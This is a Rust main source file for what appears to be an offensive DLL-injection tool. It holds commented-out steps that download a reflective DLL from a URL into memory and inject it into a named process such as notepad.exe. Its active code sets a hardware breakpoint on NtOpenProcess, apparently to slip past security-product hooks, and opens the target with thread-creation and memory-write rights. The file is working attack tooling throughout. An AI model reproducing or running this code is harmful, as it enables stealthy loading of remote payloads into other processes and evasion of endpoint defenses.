mod download;
mod parse_pe;
mod inject;
mod hwbp;

use windows::core::w;

use std::ptr::null_mut;
use ntapi::{
    ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory},
    ntpsapi::{NtCreateThreadEx, NtOpenProcess},
    ntobapi::NtClose,
    ntapi_base::CLIENT_ID,
};
use winapi::{
    shared::ntdef::{
        HANDLE, OBJECT_ATTRIBUTES, PVOID, 
    },
    shared::ntstatus::STATUS_SUCCESS,
    shared::basetsd::SIZE_T,
    um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE, PROCESS_VM_READ, THREAD_ALL_ACCESS,
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    },
};

use clap::Parser;

/// Inject ReflectiveDLL.dll into a target process.
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {

    /// Target process name (e.g., notepad.exe)
    #[arg(short, long)]
    process: String,

    // #[arg(short, long, conflicts_with = "url")]
    // file: Option<String>,

    // #[arg(short, long, conflicts_with = "file")]

    /// URL to download the DLL from (e.g., http://example.com/ReflectiveDLL.dll)
    #[arg(short, long)]
    url: Option<String>,
}


fn main() {
    // let args = Args::parse();

    // let Some(url) = args.url else {
    //     eprintln!("Error: --url must be provided.");
    //     std::process::exit(1);
    // };


    // println!("Downloading from {}", url);

    // let data = download::download_to_memory(&url, None, None)
    //     .expect("Failed to download file");

    // if data.len() > 0 {
    //     println!("Downloaded {} bytes", data.len());
    // } else {
    //     println!("Downloaded empty file");
    // }


    // // let dll = pe_parser::new(data);
    // let dll = parse_pe::PeParser::new(data);

    // let func_raw = dll.get_func_raw("yolo").expect("Failed to find ReflectiveLoader function");
    // println!("ReflectiveLoader raw offset: 0x{:X}", func_raw);

    // inject::inject_dll_into_process(
    //     &args.process.encode_utf16().collect::<Vec<u16>>(),
    //     &dll,
    //     func_raw,
    // ).expect("Failed to inject DLL!\n");

    // let ssn = unsafe { hwbp::get_syscall_number("NtMapViewOfSection\0") };
    // println!("NtMapViewOfSection syscall number: {:?}", ssn);
    unsafe {
        hwbp::hwbp_init().expect("Failed to initialize hardware breakpoints!");   

        let dr = hwbp::DR::Dr0;
        hwbp::set_hwbp(&dr, "NtOpenProcess\0").expect("Failed to set hardware breakpoint on OpenProcess!");


        let pid = inject::get_process_pid_by_name(w!("notepad.exe").as_wide()).expect("[ERROR] Process not found");


        let mut process_handle: HANDLE = null_mut();
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: 0 as _,
        };

        let mut object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: null_mut(),
            ObjectName: null_mut(),
            Attributes: 0,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        }; 

        let desired_access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

        let status = unsafe {
            NtOpenProcess(
                &mut process_handle,
                desired_access,
                &mut object_attributes,
                &mut client_id,
            )
        };

        if status != STATUS_SUCCESS {
            println!("[ERROR] Failed to open process: 0x{:X}", status);

            hwbp::unset_hwbp(&dr);

            hwbp::hwbp_cleanup().expect("Failed to cleanup hardware breakpoints!");
            return;
        }

        println!("Successfully opened process with handle: {:?}", process_handle);



        hwbp::unset_hwbp(&dr);

        hwbp::hwbp_cleanup().expect("Failed to cleanup hardware breakpoints!");

    }



}
